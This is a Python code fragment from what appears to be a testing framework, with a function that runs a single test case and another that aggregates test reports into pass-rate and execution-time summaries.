async def run_specific_test(test_id: str, test_case: TestCase) -> TestExecution:
    """Run a specific test case"""
    await test_framework.initialize_test_environment()
    return await test_framework.run_single_test(test_case)

def generate_test_report_summary(reports: List[TestReport]) -> Dict[str, Any]:
    """Generate a summary of test reports"""
    if not reports:
        return {}

    total_suites = len(reports)
    total_tests = sum(r.total_tests for r in reports)
    total_passed = sum(r.passed_tests for r in reports)
    total_failed = sum(r.failed_tests for r in reports)

    avg_execution_time = statistics.mean([r.average_execution_time for r in reports if r.test_results])

    return {
        "total_suites": total_suites,
        "total_tests": total_tests,
        "total_passed": total_passed,
        "total_failed": total_failed,
        "overall_pass_rate": total_passed / total_tests if total_tests > 0 else 0,
        "average_execution_time": avg_execution_time,
        "suites": [
            {
                "name": r.suite_name,
                "pass_rate": r.passed_tests / r.total_tests if r.total_tests > 0 else 0,
                "execution_time": r.total_duration
            }
            for r in reports
        ]
    }
